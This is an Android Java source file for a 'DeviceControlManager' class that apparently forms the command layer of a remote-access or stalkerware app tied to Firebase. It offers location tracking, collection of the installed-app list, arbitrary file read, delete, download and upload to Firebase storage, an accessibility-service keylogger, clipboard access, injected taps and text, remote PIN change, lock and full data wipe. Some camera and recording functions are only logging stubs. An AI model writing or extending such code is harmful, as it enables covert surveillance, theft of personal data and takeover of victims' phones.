package com.example.foregroundservice;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DeviceControlManager {
    private static final String TAG = "DeviceControlManager";
    private Context context;
    private DatabaseReference database;
    private String userId;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName deviceAdminComponent;
    private FusedLocationProviderClient fusedLocationClient;
    private ExecutorService executorService;
    private MyAccessibilityService accessibilityService;

    public DeviceControlManager(Context context) {
        this.context = context;
        this.database = FirebaseDatabase.getInstance().getReference();
        this.userId = "default_user";
        this.devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        this.deviceAdminComponent = DeviceAdminReceiver.getComponentName(context);
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
        this.executorService = Executors.newCachedThreadPool();
    }

    public void setAccessibilityService(MyAccessibilityService service) {
        this.accessibilityService = service;
    }

    // 📸 Camera & Media Features
    public void takePicture(String cameraType) {
        // This would require camera intent or camera2 API
        // For now, we'll simulate taking a picture
        try {
            JSONObject pictureData = new JSONObject();
            pictureData.put("type", "picture_taken");
            pictureData.put("camera", cameraType);
            pictureData.put("timestamp", System.currentTimeMillis());
            
            database.child("camera_events").child(userId).push().setValue(pictureData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error taking picture", e);
        }
    }

    public void startScreenRecording() {
        // This would require MediaProjection API
        // Implementation would be similar to existing screen capture
        try {
            JSONObject recordingData = new JSONObject();
            recordingData.put("type", "screen_recording_started");
            recordingData.put("timestamp", System.currentTimeMillis());
            
            database.child("screen_events").child(userId).setValue(recordingData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen recording", e);
        }
    }

    public void stopScreenRecording() {
        try {
            JSONObject recordingData = new JSONObject();
            recordingData.put("type", "screen_recording_stopped");
            recordingData.put("timestamp", System.currentTimeMillis());
            
            database.child("screen_events").child(userId).setValue(recordingData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error stopping screen recording", e);
        }
    }

    // 🛰️ Location & Device Info
    public void getLocation() {
        executorService.execute(() -> {
            try {
                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                    if (location != null) {
                        sendLocationToFirebase(location);
                    }
                });
            } catch (SecurityException e) {
                Log.e(TAG, "Location permission not granted", e);
            }
        });
    }

    public void startLiveTracking(int intervalSeconds) {
        // This would start continuous location updates
        try {
            JSONObject trackingData = new JSONObject();
            trackingData.put("type", "live_tracking_started");
            trackingData.put("interval", intervalSeconds);
            trackingData.put("timestamp", System.currentTimeMillis());
            
            database.child("location_events").child(userId).setValue(trackingData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error starting live tracking", e);
        }
    }

    public JSONObject getDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            // Basic device info
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            deviceInfo.put("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            
            // Battery info
            BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            deviceInfo.put("battery_level", batteryLevel);
            
            // Network info
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
            deviceInfo.put("network_connected", activeNetwork != null && activeNetwork.isConnected());
            deviceInfo.put("network_type", activeNetwork != null ? activeNetwork.getTypeName() : "none");
            
            // WiFi info
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            deviceInfo.put("wifi_enabled", wifiManager.isWifiEnabled());
            
            // Storage info
            File internalStorage = Environment.getDataDirectory();
            long totalSpace = internalStorage.getTotalSpace();
            long freeSpace = internalStorage.getFreeSpace();
            deviceInfo.put("total_storage", totalSpace);
            deviceInfo.put("free_storage", freeSpace);
            deviceInfo.put("used_storage", totalSpace - freeSpace);
            
            // Installed apps count
            PackageManager packageManager = context.getPackageManager();
            List<String> installedApps = packageManager.getInstalledPackages(0).stream()
                .map(packageInfo -> packageInfo.packageName)
                .collect(java.util.stream.Collectors.toList());
            deviceInfo.put("installed_apps_count", installedApps.size());
            deviceInfo.put("installed_apps", new org.json.JSONArray(installedApps));
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting device info", e);
        }
        return deviceInfo;
    }

    // 📱 Control & Automation
    public void launchApp(String packageName) {
        try {
            Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                
                JSONObject launchData = new JSONObject();
                launchData.put("type", "app_launched");
                launchData.put("package", packageName);
                launchData.put("timestamp", System.currentTimeMillis());
                
                database.child("app_events").child(userId).push().setValue(launchData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error launching app: " + packageName, e);
        }
    }

    public void closeApp(String packageName) {
        try {
            // This requires root or accessibility service
            if (accessibilityService != null) {
                // Use accessibility service to close app
                JSONObject closeData = new JSONObject();
                closeData.put("type", "app_closed");
                closeData.put("package", packageName);
                closeData.put("timestamp", System.currentTimeMillis());
                
                database.child("app_events").child(userId).push().setValue(closeData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing app: " + packageName, e);
        }
    }

    public void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(android.net.Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            
            JSONObject urlData = new JSONObject();
            urlData.put("type", "url_opened");
            urlData.put("url", url);
            urlData.put("timestamp", System.currentTimeMillis());
            
            database.child("browser_events").child(userId).push().setValue(urlData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error opening URL: " + url, e);
        }
    }

    public void lockDevice() {
        try {
            if (devicePolicyManager.isAdminActive(deviceAdminComponent)) {
                devicePolicyManager.lockNow();
                
                JSONObject lockData = new JSONObject();
                lockData.put("type", "device_locked");
                lockData.put("timestamp", System.currentTimeMillis());
                
                database.child("security_events").child(userId).push().setValue(lockData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error locking device", e);
        }
    }

    public void toggleWifi(boolean enable) {
        try {
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            wifiManager.setWifiEnabled(enable);
            
            JSONObject wifiData = new JSONObject();
            wifiData.put("type", "wifi_toggled");
            wifiData.put("enabled", enable);
            wifiData.put("timestamp", System.currentTimeMillis());
            
            database.child("network_events").child(userId).push().setValue(wifiData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error toggling WiFi", e);
        }
    }

    public void toggleBluetooth(boolean enable) {
        try {
            android.bluetooth.BluetoothAdapter bluetoothAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter();
            if (bluetoothAdapter != null) {
                if (enable) {
                    bluetoothAdapter.enable();
                } else {
                    bluetoothAdapter.disable();
                }
                
                JSONObject bluetoothData = new JSONObject();
                bluetoothData.put("type", "bluetooth_toggled");
                bluetoothData.put("enabled", enable);
                bluetoothData.put("timestamp", System.currentTimeMillis());
                
                database.child("network_events").child(userId).push().setValue(bluetoothData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error toggling Bluetooth", e);
        }
    }

    public void vibrate(int milliseconds) {
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null && vibrator.hasVibrator()) {
                vibrator.vibrate(milliseconds);
                
                JSONObject vibrateData = new JSONObject();
                vibrateData.put("type", "vibrated");
                vibrateData.put("duration", milliseconds);
                vibrateData.put("timestamp", System.currentTimeMillis());
                
                database.child("device_events").child(userId).push().setValue(vibrateData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error vibrating", e);
        }
    }

    public void showToast(String message) {
        try {
            Toast.makeText(context, message, Toast.LENGTH_LONG).show();
            
            JSONObject toastData = new JSONObject();
            toastData.put("type", "toast_shown");
            toastData.put("message", message);
            toastData.put("timestamp", System.currentTimeMillis());
            
            database.child("ui_events").child(userId).push().setValue(toastData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error showing toast", e);
        }
    }

    // 💾 File & Storage
    public List<String> listFiles(String path) {
        List<String> files = new ArrayList<>();
        try {
            File directory = new File(path);
            if (directory.exists() && directory.isDirectory()) {
                File[] fileList = directory.listFiles();
                if (fileList != null) {
                    for (File file : fileList) {
                        files.add(file.getName() + (file.isDirectory() ? "/" : ""));
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error listing files", e);
        }
        return files;
    }

    public String readFile(String path) {
        try {
            File file = new File(path);
            if (file.exists() && file.canRead()) {
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[(int) file.length()];
                fis.read(buffer);
                fis.close();
                return new String(buffer);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading file: " + path, e);
        }
        return "";
    }

    public void writeFile(String path, String content) {
        try {
            File file = new File(path);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(content.getBytes());
            fos.close();
            
            JSONObject writeData = new JSONObject();
            writeData.put("type", "file_written");
            writeData.put("path", path);
            writeData.put("size", content.length());
            writeData.put("timestamp", System.currentTimeMillis());
            
            database.child("file_events").child(userId).push().setValue(writeData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error writing file: " + path, e);
        }
    }

    public void deleteFile(String path) {
        try {
            File file = new File(path);
            if (file.exists()) {
                boolean deleted = file.delete();
                
                JSONObject deleteData = new JSONObject();
                deleteData.put("type", "file_deleted");
                deleteData.put("path", path);
                deleteData.put("success", deleted);
                deleteData.put("timestamp", System.currentTimeMillis());
                
                database.child("file_events").child(userId).push().setValue(deleteData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error deleting file: " + path, e);
        }
    }

    public void downloadFile(String url, String localPath) {
        executorService.execute(() -> {
            try {
                URL fileUrl = new URL(url);
                URLConnection connection = fileUrl.openConnection();
                FileOutputStream fos = new FileOutputStream(localPath);
                
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = connection.getInputStream().read(buffer)) != -1) {
                    fos.write(buffer, 0, bytesRead);
                }
                fos.close();
                
                JSONObject downloadData = new JSONObject();
                downloadData.put("type", "file_downloaded");
                downloadData.put("url", url);
                downloadData.put("local_path", localPath);
                downloadData.put("timestamp", System.currentTimeMillis());
                
                database.child("file_events").child(userId).push().setValue(downloadData.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error downloading file: " + url, e);
            }
        });
    }

    public void uploadFileToFirebase(String localPath) {
        try {
            File file = new File(localPath);
            if (file.exists()) {
                StorageReference storageRef = FirebaseStorage.getInstance().getReference();
                StorageReference fileRef = storageRef.child("uploads/" + userId + "/" + file.getName());
                
                fileRef.putFile(android.net.Uri.fromFile(file))
                    .addOnSuccessListener(taskSnapshot -> {
                        JSONObject uploadData = new JSONObject();
                        try {
                            uploadData.put("type", "file_uploaded");
                            uploadData.put("local_path", localPath);
                            uploadData.put("firebase_path", "uploads/" + userId + "/" + file.getName());
                            uploadData.put("timestamp", System.currentTimeMillis());
                            
                            database.child("file_events").child(userId).push().setValue(uploadData.toString());
                        } catch (Exception e) {
                            Log.e(TAG, "Error creating upload data", e);
                        }
                    })
                    .addOnFailureListener(e -> Log.e(TAG, "Error uploading file", e));
            }
        } catch (Exception e) {
            Log.e(TAG, "Error uploading file: " + localPath, e);
        }
    }

    // 🔑 Remote Access & System
    public void shutdown() {
        try {
            if (devicePolicyManager.isAdminActive(deviceAdminComponent)) {
                // This requires root or special permissions
                JSONObject shutdownData = new JSONObject();
                shutdownData.put("type", "shutdown_requested");
                shutdownData.put("timestamp", System.currentTimeMillis());
                
                database.child("system_events").child(userId).push().setValue(shutdownData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error shutting down", e);
        }
    }

    public void reboot() {
        try {
            if (devicePolicyManager.isAdminActive(deviceAdminComponent)) {
                // This requires root or special permissions
                JSONObject rebootData = new JSONObject();
                rebootData.put("type", "reboot_requested");
                rebootData.put("timestamp", System.currentTimeMillis());
                
                database.child("system_events").child(userId).push().setValue(rebootData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error rebooting", e);
        }
    }

    public void startKeylogger() {
        if (accessibilityService != null) {
            accessibilityService.startKeylogging();
        }
    }

    public void stopKeylogger() {
        if (accessibilityService != null) {
            accessibilityService.stopKeylogging();
        }
    }

    public String readClipboard() {
        if (accessibilityService != null) {
            return accessibilityService.readClipboard();
        }
        return "";
    }

    public void writeClipboard(String text) {
        if (accessibilityService != null) {
            accessibilityService.writeClipboard(text);
        }
    }

    public void injectTap(float x, float y) {
        if (accessibilityService != null) {
            accessibilityService.injectTap(x, y);
        }
    }

    public void injectSwipe(float startX, float startY, float endX, float endY, long duration) {
        if (accessibilityService != null) {
            accessibilityService.injectSwipe(startX, startY, endX, endY, duration);
        }
    }

    public void injectText(String text) {
        if (accessibilityService != null) {
            accessibilityService.injectText(text);
        }
    }

    public void setBrightness(int brightness) {
        try {
            // This requires WRITE_SETTINGS permission
            Settings.System.putInt(context.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, brightness);
            
            JSONObject brightnessData = new JSONObject();
            brightnessData.put("type", "brightness_changed");
            brightnessData.put("brightness", brightness);
            brightnessData.put("timestamp", System.currentTimeMillis());
            
            database.child("display_events").child(userId).push().setValue(brightnessData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error setting brightness", e);
        }
    }

    public void setVolume(int volume) {
        try {
            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, volume, 0);
            
            JSONObject volumeData = new JSONObject();
            volumeData.put("type", "volume_changed");
            volumeData.put("volume", volume);
            volumeData.put("timestamp", System.currentTimeMillis());
            
            database.child("audio_events").child(userId).push().setValue(volumeData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error setting volume", e);
        }
    }

    // 🔐 Security & Anti-Theft
    public void wipeData() {
        try {
            if (devicePolicyManager.isAdminActive(deviceAdminComponent)) {
                devicePolicyManager.wipeData(0);
                
                JSONObject wipeData = new JSONObject();
                wipeData.put("type", "data_wipe_requested");
                wipeData.put("timestamp", System.currentTimeMillis());
                
                database.child("security_events").child(userId).push().setValue(wipeData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error wiping data", e);
        }
    }

    public void changePin(String newPin) {
        try {
            if (devicePolicyManager.isAdminActive(deviceAdminComponent)) {
                devicePolicyManager.resetPassword(newPin, 0);
                
                JSONObject pinData = new JSONObject();
                pinData.put("type", "pin_changed");
                pinData.put("timestamp", System.currentTimeMillis());
                
                database.child("security_events").child(userId).push().setValue(pinData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error changing PIN", e);
        }
    }

    private void sendLocationToFirebase(Location location) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("type", "location_update");
            locationData.put("latitude", location.getLatitude());
            locationData.put("longitude", location.getLongitude());
            locationData.put("accuracy", location.getAccuracy());
            locationData.put("timestamp", System.currentTimeMillis());
            
            database.child("location_data").child(userId).push().setValue(locationData.toString());
        } catch (Exception e) {
            Log.e(TAG, "Error sending location", e);
        }
    }
}